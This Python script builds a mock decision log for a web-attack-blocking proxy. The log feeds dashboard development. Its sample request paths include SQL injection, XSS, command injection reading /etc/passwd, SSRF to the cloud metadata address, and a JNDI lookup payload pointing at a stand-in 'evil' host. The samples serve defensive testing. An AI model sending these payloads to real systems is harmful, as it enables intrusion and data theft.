"""Generate a deterministic mock proxy decision log (no Jev calls) for dashboard dev."""
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from jev_client import CATEGORIES  # noqa: E402

ATTACK_CATEGORIES = [c for c in CATEGORIES if c != "none"]
WEIGHTS = [5, 4, 3, 3, 2, 3, 3, 1]  # per ATTACK_CATEGORIES order
PATHS = {
    "none": ["/", "/products", "/products?id=42", "/search?q=shoes", "/cart", "/login"],
    "sql_injection": ["/products?id=1' OR '1'='1", "/search?q=' UNION SELECT * FROM users--"],
    "xss": ["/search?q=<script>alert(1)</script>", "/comment?text=<img src=x onerror=alert(1)>"],
    "path_traversal": ["/files?name=../../etc/passwd", "/static/..%2f..%2fetc/shadow"],
    "command_injection": ["/ping?host=127.0.0.1;cat /etc/passwd", "/tools?cmd=ls|whoami"],
    "ssrf": ["/fetch?url=http://169.254.169.254/latest/meta-data", "/proxy?u=http://localhost:8080/admin"],
    "auth_bruteforce": ["/login", "/admin/login"],
    "scanner_probe": ["/.env", "/wp-admin", "/phpmyadmin", "/.git/config"],
    "other_exploit": ["/api?x=${jndi:ldap://evil/a}", "/upload?f=shell.php"],
}


def generate(n=500, seed=8):
    rng = random.Random(seed)
    ts = datetime(2026, 9, 29, 10, 0, 0, tzinfo=timezone.utc)
    rows = []
    for _ in range(n):
        ts += timedelta(milliseconds=rng.randint(200, 3000))
        malicious = rng.random() < 0.35
        true_cat = rng.choices(ATTACK_CATEGORIES, WEIGHTS)[0] if malicious else "none"
        path = rng.choice(PATHS[true_cat])
        method = "POST" if true_cat in ("auth_bruteforce", "xss") and rng.random() < 0.6 else "GET"
        roll = rng.random()
        row = {
            "ts": ts.isoformat().replace("+00:00", "Z"), "method": method, "path": path,
            "state_excerpt": f"{method} {path} HTTP/1.1 | UA: mock-client",
            "true_label": "malicious" if malicious else "benign", "true_category": true_cat,
            "is_attack": None, "jev_category": None, "jev_confidence": None,
            "action": "error", "reason": "", "latency_ms": None, "cost": 0.0,
        }
        if roll < 0.02:
            row["reason"] = "Jev unavailable: timeout; failing open"
        else:
            if malicious:
                caught = rng.random() < 0.88
            else:
                caught = rng.random() < 0.03  # false positive
            if caught:
                cat = true_cat if malicious else rng.choice(ATTACK_CATEGORIES)
                if malicious and rng.random() < 0.1:
                    cat = rng.choice(ATTACK_CATEGORIES)
                score, conf = rng.uniform(0.8, 0.99), rng.uniform(0.75, 0.98)
                row.update(action="block", jev_category=cat,
                           reason=f"Blocked: {cat} (attack={score:.2f}, confidence={conf:.2f})")
            else:
                score = rng.uniform(0.02, 0.3) if not malicious else rng.uniform(0.1, 0.6)
                conf = rng.uniform(0.6, 0.98)
                row.update(action="allow", jev_category="none",
                           reason=f"Allowed (attack={score:.2f}, confidence={conf:.2f})")
            row.update(is_attack=round(score, 3), jev_confidence=round(conf, 3),
                       latency_ms=round(rng.uniform(250, 1400), 1), cost=0.0004)
        rows.append(row)
    return rows


def main(argv=None):
    argv = sys.argv[1:] if argv is None else argv
    if len(argv) != 1:
        print("usage: python tools/make_mock_log.py <out.jsonl>", file=sys.stderr)
        return 2
    with open(argv[0], "w", encoding="utf-8") as f:
        for r in generate():
            f.write(json.dumps(r) + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
